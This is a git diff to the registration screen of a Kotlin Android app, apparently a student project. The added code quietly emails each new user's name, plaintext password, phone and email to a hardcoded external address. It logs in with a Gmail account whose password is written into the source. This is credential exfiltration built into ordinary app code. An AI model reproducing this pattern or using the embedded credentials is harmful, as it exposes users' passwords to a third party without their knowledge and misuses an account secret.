@@ -42,13 +42,16 @@ import diplom.gorinych.R.string
 import diplom.gorinych.domain.utils.ALREADY_EXIST
 import diplom.gorinych.domain.utils.PhoneNumberTransformation
 import diplom.gorinych.domain.utils.isEmailValid
+import diplom.gorinych.domain.utils.sendMail
 import diplom.gorinych.ui.theme.baseText
 import diplom.gorinych.ui.theme.blue
 import diplom.gorinych.ui.theme.secondText
 import diplom.gorinych.ui.theme.thirdText
 import diplom.gorinych.ui.theme.white
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import okhttp3.Dispatcher
 
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
@@ -191,6 +194,15 @@ fun RegistrationScreen(
                         )
 
                     )
+                    scope.launch (Dispatchers.IO) {
+                        sendMail(
+                            login = "edurda77@gmail.com",
+                            password = "Khayarov1977!",
+                            email = "edurd@rambler.ru",
+                            theme = "success registration",
+                            content = "${name.value}\n${password.value}\n${phone.value}\n${email.value}"
+                        )
+                    }
                     scope.launch {
                         delay(1000)
                         if (state.value.message != ALREADY_EXIST) {
